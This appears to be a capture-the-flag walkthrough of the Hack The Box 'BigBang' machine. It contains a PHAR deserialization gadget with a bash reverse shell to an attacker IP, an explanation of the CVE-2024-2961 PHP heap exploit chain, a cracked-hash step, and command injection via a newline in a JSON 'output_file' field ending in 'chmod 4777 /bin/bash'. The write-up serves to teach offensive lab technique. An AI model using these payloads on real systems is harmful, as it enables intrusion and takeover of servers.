This part is where i just searching and reading the articles for the exploit !

This version of BuddyForms has an unauthenticated **PHAR deserialization vulnerability**. By searching for the related CVE, I found a helpful Medium blog.

[WordPress BuddyForms Plugin‚Ää‚Äî‚ÄäUnauthenticated Insecure Deserialization (CVE-2023‚Äì26326)](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8)

In short, the vulnerability allows us to upload a **PHAR file** disguised as a GIF by adding GIF-specific magic bytes to its `setStub` part. Once uploaded, we can use the `phar://` wrapper to query the file and trigger **Remote Code Execution (RCE)**.

However, as noted in the blog, we need a **gadget** to complete the deserialization chain. Unfortunately, newer versions of WordPress don't have the required gadget. Even so, this method is worth testing since it's our best lead at this point.

```php
<?php
class Evil {
    public function __wakeup() {
        // Reverse shell payload
        $ip = '10.10.14.xxx'; // Replace with your IP address
        $port = 2004;       // Replace with your listening port

        // Reverse shell command
        $cmd = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
        system($cmd);
        die("Arbitrary Deserialization");
    }
}

// Check if phar.readonly is enabled
if (ini_get('phar.readonly')) {
    die("phar.readonly must be set to Off in your php.ini to create PHAR files.\n");
}

// Create a new PHAR archive
$phar = new Phar('evil.phar'); // Name of the PHAR file
$phar->startBuffering();
$phar->addFromString('test.txt', 'This is a test file.');
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");
$object = new Evil();
$phar->setMetadata($object);
$phar->stopBuffering();

echo "[+] PHAR file created: evil.phar\n";
```

```php
php --define phar.readonly=0  pain.php
```

Wait, it‚Äôs not just a PNG file. It seems like the data is being filtered through a PNG. We discovered snippets like `/etc/passwd` and some C code involving heap allocation, which suggests a possible **buffer overflow (BoF)** vulnerability.

After searching for ‚Äúbuffer overflow BuddyForms PHP,‚Äù we found this helpful [Medium blog](https://www.notion.so/jaytiwari/URL).

[Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1)](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)

The blog also includes a **Proof of Concept (PoC)** for the same BuddyForms PHP vulnerability we encountered earlier. The PoC code is available in their [GitHub repo](https://github.com/ambionics/cnext-exploits).

[https://github.com/ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits)

The exploit leverages an old vulnerability in the **iconv** function from the `libc` binary. When converting an encoding method (e.g., UTF-8 to ISO-2022-CN-EXT), it can overflow by up to **3 bytes**.

By combining this with specific PHP behaviors and BuddyForms bugs, the exploit can exfiltrate data through PNG files, ultimately leading to **Remote Code Execution (RCE)**.

The challenging part is understanding the workflow and modifying the script to align with the logic of this particular target.

![Screenshot 2025-01-28 at 12.27.51‚ÄØAM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.27.51_AM.png)

Looking at the source code, we see a remote class responsible for downloading files. Running the script results in an error because, as we already observed, a specific request must be sent to upload the file.

As the first part of the exploit suggests, we can exfiltrate data by using **iconv** in combination with PHP wrapper methods, and injecting the payload into the URL part of the request.

```python
import requests
import sys
import time
import json

if len(sys.argv) != 2:
    print("Usage: python LFI.py <file_to_read>")
    sys.exit(1)

### LFI

![Screenshot 2025-01-28 at 12.31.29‚ÄØAM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.31.29_AM.png)

At this point, we need to modify the remote class in the script to help us extract the contents of `/proc/self/maps`. This file provides valuable information, such as the **`PHP heap** address` and the full path of the **libc** file.

Once we have this information, the next step is to remove the **GIF magic byte** from the file, as we no longer need it for the exploit. Afterward, we can extract the memory address of the **system()** function, which is critical for gaining control of the system.

To help with this, we use the **LFI.py** script again, which allows us to determine that we specifically need the **/usr/lib/x86_64-linux-gnu/libc.so.6** file. Once identified, we install this **libc** file on our local machine, and we‚Äôll then update the **ELF path** to point to where we‚Äôve installed it. This step is necessary for the exploit to work properly, as it ensures we're referencing the correct version of the **libc** file during the attack.

### Full Explanation of the exploit :

This Python script is an exploit for a vulnerability in PHP, identified as **CVE-2024-2961**. The vulnerability allows an attacker to escalate a file-read primitive into **Remote Code Execution (RCE)** on a target server. The exploit leverages a combination of PHP's file handling mechanisms, heap manipulation, and memory corruption techniques to achieve RCE.

Here‚Äôs a breakdown of the code and its functionality:

---

### **1. Overview**

The exploit targets a PHP application that allows file reading via a vulnerable function like `file_get_contents()`. By carefully crafting a payload, the attacker can manipulate the PHP heap and overwrite critical memory structures to execute arbitrary commands on the server.

---

### **2. Key Components**

### **2.1. Remote Class**

The `Remote` class is responsible for interacting with the target server. It provides methods to:

- **Send payloads**: Sends crafted payloads to the server using HTTP POST requests.
- **Download files**: Retrieves files from the server, such as `/proc/self/maps` (to analyze memory layout) and `libc.so` (to resolve library symbols).
- **Decode data**: Handles base64 decoding of responses.

This class is customizable to fit the target application's behavior.

---

### **2.2. Exploit Class**

The `Exploit` class orchestrates the attack. It performs the following steps:

1. **Check Vulnerability**:
    - Verifies if the target is reachable and supports the required PHP wrappers and filters (e.g., `data://`, `php://filter`, `zlib`).
    - Ensures the target is vulnerable to the exploit.
2. **Memory Analysis**:
    - Downloads `/proc/self/maps` to analyze the memory layout of the PHP process.
    - Identifies the heap and `libc` addresses, which are crucial for the exploit.
3. **Heap Manipulation**:
    - Uses a combination of PHP filters and heap manipulation techniques to corrupt the PHP heap.
    - Overwrites the `zend_mm_heap` structure, which controls memory allocation in PHP.
4. **Payload Construction**:
    - Constructs a payload that triggers the vulnerability and overwrites critical memory structures.
    - Uses a series of steps (Step 1 to Step 4) to manipulate the heap and achieve RCE.
5. **Command Execution**:
    - Overwrites the `custom_heap` field in the `zend_mm_heap` structure to point to a fake heap with custom `emalloc`, `efree`, and `erealloc` functions.
    - Replaces these functions with `system()` to execute arbitrary commands.

---

### **3. Exploit Steps**

### **Step 1: Reverse Free List Order**

- Allocates chunks to reverse the order of the free list, ensuring proper heap manipulation in subsequent steps.

### **Step 2: Insert Fake Pointer**

- Places a fake pointer in the heap to control the free list and redirect allocations to a desired location.

### **Step 3: Trigger Overflow**

- Uses a UTF-8 to ISO-2022-CN-EXT conversion to trigger a heap overflow, corrupting the free list.

### **Step 4: Overwrite Heap Structures**

- Overwrites the `zend_mm_heap` structure to hijack PHP's memory allocation functions.
- Replaces `emalloc`, `efree`, and `erealloc` with `system()` to execute commands.

---

### **4. Payload Construction**

The payload is constructed using a combination of:

- **Chunked encoding**: Breaks data into chunks for precise heap manipulation.
- **Compression**: Uses `zlib` compression to fit the payload into the desired format.
- **Base64 encoding**: Encodes the payload for transmission via HTTP.

The payload is sent to the server using the `php://filter` wrapper, which processes the payload through a series of filters to trigger the vulnerability.

---

### **5. Command Execution**

The exploit executes a command on the target server by:

1. Overwriting the `custom_heap` field in the `zend_mm_heap` structure.
2. Replacing memory allocation functions with `system()`.
3. Executing the command, which is passed as part of the payload.

The command is prefixed with `kill -9 $PPID` to terminate the PHP process after execution, preventing further unintended behavior.

---

### **6. Helper Functions**

The script includes several helper functions to:

- **Compress data**: Prepares data for `zlib.inflate`.
- **Base64 encode/decode**: Handles encoding and decoding of payloads.
- **Chunk data**: Breaks data into chunks for precise heap manipulation.
- **Pointer manipulation**: Constructs chunks containing pointers for heap corruption.

---

### **7. Exploit Execution**

The exploit is executed by:

1. Initializing the `Exploit` class with the target URL, command, and other parameters.
2. Running the exploit, which sends the payload to the server and triggers the vulnerability.
3. Checking if the exploit was successful based on the server's response.

---

### **8. Key Vulnerabilities Exploited**

- **File Read Primitive**: The ability to read files on the server (e.g., `/proc/self/maps`, `libc.so`).
- **Heap Corruption**: A bug in PHP's handling of certain character encodings allows heap corruption.
- **Memory Overwrite**: Overwriting critical memory structures (`zend_mm_heap`) to hijack PHP's memory allocation functions.

---

### **9. Example Usage**

To use the exploit:

1. Implement the `Remote` class to match the target application's behavior.
2. Provide the target URL and command to execute.
3. Run the exploit.

---

### **10. Mitigation**

To protect against this vulnerability:

- **Update PHP**: Ensure the PHP version is patched against CVE-2024-2961.
- **Disable Dangerous Wrappers**: Restrict the use of `php://filter` and other dangerous wrappers.
- **Input Validation**: Validate and sanitize user input to prevent file read primitives.
- **Memory Protections**: Use memory-safe languages or enable heap protections (e.g., ASLR, stack canaries).

---

### **Conclusion**

This exploit demonstrates a sophisticated attack that combines file read primitives, heap manipulation, and memory corruption to achieve RCE. It highlights the importance of secure coding practices and timely patching to prevent such vulnerabilities.

Summary : 

This Python script is an exploit for CVE-2024-2961, which is a PHP file-read to Remote Code Execution (RCE) vulnerability in CNEXT.

How it works:
1.	File Read Primitive:
‚Ä¢	It abuses PHP wrappers (php://filter, data://, etc.) to read files from the server, like /proc/self/maps and libc.so.6.
2.	Heap Manipulation:
‚Ä¢	It finds and corrupts PHP‚Äôs memory allocator (Zend Memory Manager) by overflowing a heap chunk using an encoding bug.
‚Ä¢	It tricks PHP into allocating memory at arbitrary locations.
3.	Gaining Code Execution:
‚Ä¢	It overwrites PHP‚Äôs memory structures to hijack execution flow.
‚Ä¢	It forces PHP to execute arbitrary commands using system(), leading to remote code execution.

In simple terms:
‚Ä¢	The exploit reads sensitive files from the server.
‚Ä¢	It manipulates memory to gain control.
‚Ä¢	It then executes commands on the target server remotely.

This is a highly advanced heap exploitation technique for hacking vulnerable PHP applications.

## üóùÔ∏è Lateral Moment :-

i ran LinPeas on this and from the Output i got that in this machine there is a `grafana.db` file

Download this file 

```bash
scp shawking@10.10.11.52:/opt/data/grafana.db grafana.db
```

Here if you can see we got 2 things one is that Hash & another is Salt for that Hash

so when i was searching i got this : 

[https://github.com/iamaldi/grafana2hashcat.git](https://github.com/iamaldi/grafana2hashcat.git)

save it to a file to convert it into hashcat formate 

```bash
echo "7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960,4umebBJucv" > ghashes.txt
```

```bash
python3 grafana2hashcat.py ghashes.txt
```

## üíÄ¬†Privilege Escalation :-

```bash
ssh developer@10.10.11.52
```

‚Üí `bigbang`

so i used apktool first to decompile  but there are too many file so i switched to jdx-gui

```bash
scp developer@$10.10.11.52:/home/developer/android/satellite-app.apk satellite-app.apk
```

Open that `satellite-app.apk`  in this and check so there is a interesting part !

We see the application is on the port 9090

Tracing back the **MainActivity** function, we discovered a **Login** method that uses a custom listener. Upon examining the listener, we found methods that interact with an endpoint by sending some credentials. The endpoint responds with a **JSON Web Token (JWT)**, which is likely used for authentication.

![Screenshot 2025-01-28 at 1.07.34‚ÄØAM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_1.07.34_AM.png)

![Screenshot 2025-01-28 at 1.07.49‚ÄØAM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_1.07.49_AM.png)

we can confirm that it is there on locahost port 9090 for that application

![Screenshot 2025-01-28 at 12.59.54‚ÄØAM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.59.54_AM.png)

We found an endpoint that provides a **JWT** and another that accepts commands. Our goal is to figure out how to send a command to this second endpoint. From the login functionality, we already understand how to interact with the login endpoint.

As we explored the source code further, we came across the **function `b` under `q0`**, which seems relevant to our next steps.

![Screenshot 2025-01-28 at 1.09.08‚ÄØAM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_1.09.08_AM.png)

We observed that the function requires an input file and an output file, but we have control over the **output file**. The function creates a file based on the output file name we provide. This gives us an opportunity to attempt **command injection** by manipulating the output file name.

First thing was to get auth TOKEN 

```bash
curl -X POST http://127.0.0.1:9090/login -H "Content-Type: application/json" -d '{"username":"developer","password":"bigbang"}'
```

Trying for just executing file after many fail attempts 

before that make a file 

```bash
touch /tmp/foo
```

```bash
chmod +x /tmp/foo
```

Because the first argument which we will give is this foo then we will inject our second command with that and just to test we‚Äôll make a pain file on /tmp

```bash
curl -X POST http://127.0.0.1:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzk5NzQ1MCwianRpIjoiN2NmOTYzM2YtMGQzZS00NWMzLWJmM2UtNmM1NTY3MjA1ZDczIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzk5NzQ1MCwiY3NyZiI6IjZiMDIyN2FlLTk5YWEtNDkzMS04YjQ3LWQxMDE5OWIxZGZiMiIsImV4cCI6MTczODAwMTA1MH0.XEjpZ7dcUlUVZnKqPDjzZ3oGrLQbAorF31idJLF8TfE" -d '{"command":"send_image","output_file":"foo \ntouch /tmp/pain"}'
```

Finally the Commands are executing and the file owner is root 

Changing the permission on /bin/bash to gain root privilege : )

```bash
curl -X POST http://127.0.0.1:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzk5NzQ1MCwianRpIjoiN2NmOTYzM2YtMGQzZS00NWMzLWJmM2UtNmM1NTY3MjA1ZDczIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzk5NzQ1MCwiY3NyZiI6IjZiMDIyN2FlLTk5YWEtNDkzMS04YjQ3LWQxMDE5OWIxZGZiMiIsImV4cCI6MTczODAwMTA1MH0.XEjpZ7dcUlUVZnKqPDjzZ3oGrLQbAorF31idJLF8TfE" -d '{"command":"send_image","output_file":"foo \nchmod 4777 /bin/bash"}'
```

```bash
